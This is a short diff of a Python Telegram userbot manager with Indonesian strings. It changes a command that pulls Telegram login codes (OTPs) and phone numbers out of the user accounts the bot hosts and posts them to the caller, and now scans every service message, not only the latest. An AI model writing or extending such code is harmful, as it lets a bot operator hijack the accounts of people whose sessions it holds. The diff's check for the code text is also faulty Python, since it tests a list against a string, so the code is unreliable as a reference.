@@ -108,19 +108,15 @@ async def trash_cmd(client, message):
 async def get_my_otp(client, message):
     if len(message.command) < 2:
         return await message.reply(
-            f"<code>{message.text} user_id userbot yang aktif</code>", quote=True
+            f"<b>{message.text} ᴜsᴇʀ_ɪᴅ ᴜsᴇʀʙᴏᴛ ʏᴀɴɢ ᴀᴋᴛɪғ</b>", quote=True
         )
     try:
         for X in ubot._ubot:
             if int(message.command[1]) == X.me.id:
                 if message.command[0] == "getotp":
-                    async for otp in X.search_messages(777000, limit=1):
+                    async for otp in X.search_messages(777000):
                         if ["Kode masuk Anda:", "Your login code:"] in otp.text:
                             return await message.reply(otp.text, quote=True)
-                        else:
-                            return await message.reply(
-                                "<code>Kode Otp Tidak Di Temukan</code>", quote=True
-                            )
                 elif message.command[0] == "getnum":
                     return await message.reply(X.me.phone_number, quote=True)
     except Exception as error:
